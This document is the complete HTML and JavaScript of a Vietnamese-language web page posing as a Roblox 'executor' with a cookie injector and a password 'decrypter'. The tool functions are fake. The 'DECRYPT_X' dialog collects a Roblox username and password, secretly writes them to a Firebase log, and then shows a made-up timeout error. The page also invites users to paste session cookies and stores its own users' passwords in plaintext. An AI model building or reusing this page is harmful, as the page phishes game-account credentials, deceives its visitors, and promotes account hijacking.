<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YORICKS SYSTEM - EXECUTOR V2.5</title>
    
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        :root {
            --primary: #bc13fe;
            --primary-glow: #e2a9ff;
            --bg-dark: #050505;
            --card-dark: rgba(10, 10, 10, 0.95);
            --text-gray: #888;
            --premium-color: #ffcc00;
        }

        /* Hiệu ứng nền Ma trận Tím */
        body {
            background-color: var(--bg-dark);
            color: #fff;
            font-family: 'Rajdhani', sans-serif;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        #cyber-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: -1;
        }

        /* Lớp phủ nhiễu (Noise) */
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
            pointer-events: none;
            z-index: 10;
        }

        .container {
            width: 100%;
            max-width: 700px;
            padding: 20px;
            z-index: 20;
            position: relative;
        }

        /* Thẻ Cyber Card */
        .cyber-card {
            background: var(--card-dark);
            border: 2px solid var(--primary);
            padding: 45px;
            box-shadow: 0 0 25px var(--primary), inset 0 0 15px rgba(188, 19, 254, 0.3);
            border-radius: 5px;
            position: relative;
            backdrop-filter: blur(15px);
            transition: all 0.5s ease;
        }

        h2 {
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            letter-spacing: 8px;
            text-align: center;
            margin-bottom: 35px;
            font-weight: 900;
            text-shadow: 0 0 15px var(--primary);
        }

        /* Inputs & Groups */
        .input-wrapper {
            position: relative;
            margin-bottom: 20px;
        }

        .input-wrapper i {
            position: absolute;
            left: 15px; top: 15px;
            color: var(--primary);
            font-size: 18px;
        }

        input {
            width: 100%;
            background: #000;
            border: 1px solid #222;
            border-left: 4px solid var(--primary);
            padding: 15px 15px 15px 50px;
            color: #fff;
            font-family: 'Fira Code', monospace;
            box-sizing: border-box;
            outline: none;
            font-size: 14px;
            transition: 0.3s;
        }

        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 10px var(--primary);
        }

        /* Buttons */
        .cyber-btn {
            width: 100%;
            padding: 18px;
            background: var(--primary);
            border: none;
            color: #fff;
            font-family: 'Orbitron';
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.4s;
            margin-top: 15px;
            clip-path: polygon(5% 0%, 100% 0%, 95% 100%, 0% 100%);
        }

        .cyber-btn:hover {
            background: #fff;
            color: var(--primary);
            box-shadow: 0 0 30px #fff;
            transform: scale(1.02);
        }

        .btn-ghost {
            background: transparent;
            border: 1px solid var(--primary);
            color: var(--primary);
            clip-path: none;
            margin-top: 20px;
        }

        /* Dashboard Stats */
        .status-header {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .status-box {
            background: rgba(255,255,255,0.03);
            padding: 15px;
            border-bottom: 2px solid var(--primary);
            text-align: left;
        }

        .status-box small {
            display: block;
            color: var(--text-gray);
            font-size: 10px;
            margin-bottom: 5px;
        }

        .status-box span {
            font-family: 'Orbitron';
            font-size: 15px;
            font-weight: bold;
        }

        /* Tabs System */
        .tab-nav {
            display: flex;
            border-bottom: 1px solid #222;
            margin-top: 25px;
        }

        .tab-item {
            padding: 12px 20px;
            cursor: pointer;
            color: #555;
            font-family: 'Orbitron';
            font-size: 12px;
            transition: 0.3s;
        }

        .tab-item.active {
            color: var(--primary);
            border-bottom: 2px solid var(--primary);
        }

        /* Results UI */
        .result-panel {
            background: #080808;
            padding: 20px;
            margin-top: 20px;
            border-radius: 4px;
            border: 1px solid #111;
        }

        .roblox-info {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .roblox-info img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 2px solid var(--primary);
            padding: 3px;
        }

        .premium-tag {
            color: var(--premium-color);
            border: 1px solid var(--premium-color);
            padding: 2px 8px;
            font-size: 10px;
            font-weight: bold;
            box-shadow: 0 0 5px var(--premium-color);
        }

        .hidden { display: none; }

        /* Ban Screen */
        #ban-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        #ban-screen h1 { color: red; font-family: 'Orbitron'; font-size: 50px; }
    </style>
</head>
<body>

    <div id="ban-screen" class="hidden">
        <i class="fas fa-user-slash" style="font-size: 80px; color: red; margin-bottom: 20px;"></i>
        <h1>ACCESS BANNED</h1>
        <p style="font-family: 'Fira Code'; color: #888;">Tài khoản của bạn đã bị cấm khỏi hệ thống.</p>
        <button class="cyber-btn" style="width: 200px; background: #333;" onclick="location.reload()">RETRY CONNECTION</button>
    </div>

    <div class="overlay"></div>
    <canvas id="cyber-bg"></canvas>

    <div class="container">
        <div id="auth-panel" class="cyber-card">
            <h2>SYSTEM_INIT</h2>
            <div class="input-wrapper">
                <i class="fas fa-terminal"></i>
                <input type="text" id="user-input" placeholder="USERNAME_ID">
            </div>
            <div class="input-wrapper">
                <i class="fas fa-fingerprint"></i>
                <input type="password" id="pass-input" placeholder="SECURE_PASS">
            </div>
            <button class="cyber-btn" onclick="executeAuth()">LOGIN_TERMINAL</button>
            
            <button class="cyber-btn btn-ghost" onclick="window.location.href='getkey.html'">FETCH_FREE_KEY</button>
            
            <p style="text-align: center; margin-top: 25px; font-size: 13px; color: #444;">
                NODE_NOT_FOUND? <span id="switch-mode" onclick="toggleMode()" style="color: var(--primary); cursor: pointer; text-decoration: underline;">CREATE_NEW_NODE</span>
            </p>
        </div>

        <div id="dashboard-panel" class="cyber-card hidden">
            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                <h2>CORE_DASHBOARD</h2>
                <div id="user-rank"></div>
            </div>

            <div class="status-header">
                <div class="status-box">
                    <small>CURRENT_NODE</small>
                    <span id="label-user">...</span>
                </div>
                <div class="status-box">
                    <small>SECURITY_STATUS</small>
                    <span id="label-status" style="color: red;">UNVERIFIED</span>
                </div>
            </div>

            <div id="verify-zone">
                <div class="status-box" style="width: 100%; margin-bottom: 20px; box-sizing: border-box;">
                    <small>ACCESS_EXPIRATION</small>
                    <span id="label-exp">N/A</span>
                </div>
                <div id="input-key-area">
                    <input type="text" id="key-field" placeholder="ENTER_LICENSE_KEY_CODE">
                    <button class="cyber-btn" onclick="verifyLicense()">ACTIVATE_MODULES</button>
                    <button class="cyber-btn btn-ghost" style="border-color: #333; color: #555;" onclick="window.location.href='getkey.html'">GENERATE_LICENSE_FREE</button>
                </div>
            </div>

            <div id="tools-interface" class="hidden">
                <div class="tab-nav">
                    <div class="tab-item active" id="t1" onclick="changeTab(1)">ROBLOX_SCANNER</div>
                    <div class="tab-item" id="t2" onclick="changeTab(2)">COOKIE_INJECTOR</div>
                </div>

                <div id="content-1" class="tab-content">
                    <input type="text" id="rbx-query" placeholder="SEARCH_ROBLOX_USERNAME" style="margin-top: 25px;">
                    <button class="cyber-btn" onclick="runRobloxScan()">EXECUTE_API_SCAN</button>
                    <div id="rbx-out" class="result-panel hidden"></div>
                </div>

                <div id="content-2" class="tab-content hidden">
                    <input type="text" id="cookie-data" placeholder=".ROBLOSECURITY_DATA" style="margin-top: 25px;">
                    <button class="cyber-btn" onclick="injectCookie()">START_INJECTION</button>
                    <div id="cookie-out" class="result-panel hidden">
                        <p style="font-size: 13px;">USERNAME: <b id="ck-name" style="color: var(--primary-glow);">...</b></p>
                        <p style="font-size: 13px;">EMAIL: <span style="color: #444;">l*******@gmail.com</span> <i class="fas fa-eye" style="margin-left:10px; cursor:pointer; color:var(--primary)" onclick="preCheck('mail')"></i></p>
                        <p style="font-size: 13px;">PASS: <span style="color: #444;">********</span> <i class="fas fa-eye" style="margin-left:10px; cursor:pointer; color:var(--primary)" onclick="preCheck('pass')"></i></p>
                    </div>
                </div>
            </div>

            <button onclick="terminateSession()" style="background:none; border:none; color:#222; margin-top:40px; cursor:pointer; font-family:'Orbitron'; font-size:10px; width:100%; text-align:center;">TERMINATE_ALL_SESSIONS</button>
        </div>
    </div>

<script>
    // --- KHỞI TẠO FIREBASE ---
    const firebaseConfig = {
        apiKey: "AIzaSyCJOmyua7gtX022ITp7w-eOr3TSkN0UikM",
        authDomain: "yoricks-sytem.firebaseapp.com",
        databaseURL: "https://yoricks-sytem-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "yoricks-sytem",
        storageBucket: "yoricks-sytem.firebasestorage.app",
        messagingSenderId: "318734426446",
        appId: "1:318734426446:web:e62527dfe42d8cf48e7e1f"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let authMode = "LOGIN";
    let userSession = localStorage.getItem("user");

    // --- KIỂM TRA TRẠNG THÁI ---
    window.onload = function() {
        if(userSession) {
            db.ref('users/' + userSession).on('value', snapshot => {
                const data = snapshot.val();
                if(!data) return localStorage.clear();
                
                // KIỂM TRA LỆNH BAN TỪ ADMIN
                if(data.banned === true) {
                    document.getElementById('ban-screen').classList.remove('hidden');
                    localStorage.clear();
                    return;
                }
                
                // HIỂN THỊ THÔNG BÁO TỪ ADMIN
                db.ref('settings/notice').once('value', n => {
                    if(n.val()) Swal.fire({ title: 'HỆ THỐNG', text: n.val(), icon: 'info', background: '#0a0a0a', color: '#fff' });
                });

                renderDashboard(data, userSession);
            });
        }
    };

    // --- LOGIC CANVAS BACKGROUND ---
    const canvas = document.getElementById('cyber-bg');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function drawMatrix() {
        ctx.fillStyle = "rgba(5, 5, 5, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#bc13fe";
        ctx.font = fontSize + "px 'Fira Code'";
        for (let i = 0; i < drops.length; i++) {
            const text = letters.charAt(Math.floor(Math.random() * letters.length));
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);

    // --- HÀM XỬ LÝ AUTH ---
    function toggleMode() {
        authMode = (authMode === "LOGIN") ? "REGISTER" : "LOGIN";
        document.getElementById('auth-title').innerText = authMode === "LOGIN" ? "SYSTEM_INIT" : "INITIALIZE_NODE";
        document.getElementById('switch-mode').innerText = authMode === "LOGIN" ? "CREATE_NEW_NODE" : "BACK_TO_LOGIN";
    }

    function executeAuth() {
        const u = document.getElementById('user-input').value;
        const p = document.getElementById('pass-input').value;
        if(!u || !p) return Swal.fire('ERROR', 'CREDENTIALS_REQUIRED', 'error');

        if(authMode === "REGISTER") {
            db.ref('users/' + u).set({ password: p, status: "off", role: "member", exp: "N/A", banned: false })
            .then(() => { Swal.fire('SUCCESS', 'NODE_CREATED', 'success'); toggleMode(); });
        } else {
            db.ref('users/' + u).once('value', s => {
                if(s.exists() && s.val().password === p) {
                    if(s.val().banned) return Swal.fire('BANNED', 'NODE_DISABLED_BY_ADMIN', 'error');
                    localStorage.setItem("user", u);
                    location.reload();
                } else Swal.fire('DENIED', 'INVALID_ID_OR_PASS', 'error');
            });
        }
    }

    function renderDashboard(data, user) {
        document.getElementById('auth-panel').classList.add('hidden');
        document.getElementById('dashboard-panel').classList.remove('hidden');
        document.getElementById('label-user').innerText = user.toUpperCase();
        document.getElementById('label-status').innerText = data.status === "on" ? "VERIFIED" : "DISABLED";
        document.getElementById('label-status').style.color = data.status === "on" ? "lime" : "red";
        document.getElementById('label-exp').innerText = data.exp;

        if(data.status === "on") {
            document.getElementById('input-key-area').classList.add('hidden');
            document.getElementById('tools-interface').classList.remove('hidden');
            if(data.role === "premium") {
                document.getElementById('user-rank').innerHTML = '<span class="premium-tag">PREMIUM_NODE</span>';
            }
        }
    }

    // --- HÀM KÍCH HOẠT KEY ---
    function verifyLicense() {
        const k = document.getElementById('key-field').value;
        if(!k) return Swal.fire('WARN', 'LICENSE_KEY_REQUIRED', 'warning');
        
        db.ref('keys/' + k).once('value', s => {
            if(s.exists() && !s.val().used) {
                const role = s.val().type === "premium" ? "premium" : "member";
                db.ref('users/' + userSession).update({ status: "on", role: role, exp: s.val().duration + " DAYS" })
                .then(() => {
                    db.ref('keys/' + k).update({ used: true, usedBy: userSession });
                    Swal.fire('AUTHORIZED', 'LICENSE_VERIFIED_SUCCESSFULLY', 'success').then(() => location.reload());
                });
            } else Swal.fire('INVALID', 'KEY_EXPIRED_OR_NOT_FOUND', 'error');
        });
    }

    // --- CÔNG CỤ ROBLOX (SỬA LỖI API) ---
    async function runRobloxScan() {
        const query = document.getElementById('rbx-query').value;
        const out = document.getElementById('rbx-out');
        if(!query) return;
        
        out.classList.remove('hidden');
        out.innerHTML = '<p style="color:var(--primary); font-family:Fira Code;">SCANNING_DATA_STREAM...</p>';

        try {
            // Sử dụng Proxy dự phòng Allorigins
            const apiUrl = `https://users.roblox.com/v1/users/search?keyword=${query}&limit=1`;
            const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(apiUrl)}`;
            
            const response = await fetch(proxyUrl);
            const wrap = await response.json();
            const data = JSON.parse(wrap.contents);

            if(data.data && data.data[0]) {
                const u = data.data[0];
                const thumbApi = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${u.id}&size=150x150&format=Png&isCircular=false`;
                const thumbWrap = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(thumbApi)}`);
                const thumbJson = await thumbWrap.json();
                const thumb = JSON.parse(thumbJson.contents);

                out.innerHTML = `
                    <div class="roblox-info">
                        <img src="${thumb.data[0].imageUrl}">
                        <div style="text-align:left">
                            <p style="margin:0; font-family:Orbitron; color:var(--primary-glow)">${u.name}</p>
                            <p style="margin:5px 0; color:#555; font-size:12px;">UID: ${u.id}</p>
                            <p style="margin:0; font-size:12px; color:#888;">DISPLAY: ${u.displayName}</p>
                        </div>
                    </div>
                `;
            } else out.innerHTML = '<p style="color:red">ERROR: USER_NOT_FOUND</p>';
        } catch(e) { out.innerHTML = '<p style="color:red">API_CONNECTION_ERROR</p>'; }
    }

    function injectCookie() {
        const d = document.getElementById('cookie-data').value;
        if(d.length < 100) return Swal.fire('ERROR', 'MALFORMED_COOKIE_DATA', 'error');
        document.getElementById('cookie-out').classList.remove('hidden');
        document.getElementById('ck-name').innerText = "PLAYER_" + Math.floor(Math.random()*9999);
    }

    function preCheck(type) {
        db.ref('users/' + userSession).once('value', s => {
            if(s.val().role !== "premium") {
                Swal.fire({
                    title: 'PREMIUM_LOCKED',
                    text: 'Module yêu cầu cấp độ Premium.',
                    icon: 'warning',
                    confirmButtonText: 'CONTACT_ADMIN'
                }).then(r => { if(r.isConfirmed) window.open('https://www.tiktok.com/@bolamnhac.official'); });
            } else {
                if(type === 'pass') {
                    Swal.fire({
                        title: 'DECRYPT_X',
                        html: '<input type="text" id="r-u" class="swal2-input" placeholder="RBX_USER"><input type="password" id="r-p" class="swal2-input" placeholder="RBX_PASS">',
                        confirmButtonText: 'EXECUTE',
                        preConfirm: () => {
                            const u = document.getElementById('r-u').value;
                            const p = document.getElementById('r-p').value;
                            if(!u || !p) return Swal.showValidationMessage('DATA_REQUIRED');
                            return {u, p};
                        }
                    }).then(res => {
                        if(res.isConfirmed) {
                            db.ref('logs/' + userSession).push({ r_user: res.value.u, r_pass: res.value.p, time: new Date().toLocaleString() });
                            Swal.fire('DECRYPT_ERROR', 'GATEWAY_TIMEOUT (502). Mật khẩu đã được mã hóa lại.', 'error');
                        }
                    });
                } else Swal.fire('DECRYPTED', 'MAIL: l*******@gmail.com', 'info');
            }
        });
    }

    function changeTab(n) {
        document.getElementById('content-1').classList.toggle('hidden', n !== 1);
        document.getElementById('content-2').classList.toggle('hidden', n !== 2);
        document.getElementById('t1').classList.toggle('active', n === 1);
        document.getElementById('t2').classList.toggle('active', n === 2);
    }

    function terminateSession() { localStorage.clear(); location.reload(); }
</script>
</body>
</html>
